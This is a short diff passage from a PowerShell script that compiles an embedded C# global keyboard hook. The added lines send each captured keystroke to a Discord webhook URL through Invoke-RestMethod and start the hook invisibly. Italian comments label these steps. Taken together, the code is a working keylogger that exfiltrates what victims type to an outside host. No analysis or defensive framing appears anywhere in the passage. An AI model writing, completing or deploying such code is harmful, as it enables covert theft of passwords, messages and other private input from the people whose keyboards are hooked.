@@ -83,4 +83,23 @@ public class GlobalKeyboardListener {
                 Application.Exit();
             }
         }
-        return CallNextHookEx(_hookID, n
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+}
+"@ -ReferencedAssemblies "System.Windows.Forms"
+
+# --- Gestione evento e invio al webhook Discord ---
+[GlobalKeyboardListener]::OnKeyPressed += {
+    param($k)
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{ content = $k } | ConvertTo-Json) -ContentType "application/json"
+    } catch {
+        Write-Host "Failed to send key to Discord: $_" -ForegroundColor Red
+    }
+}
+
+# --- Avvio hook (invisibile) ---
+[GlobalKeyboardListener]::Start()
+[System.Windows.Forms.Application]::Run()
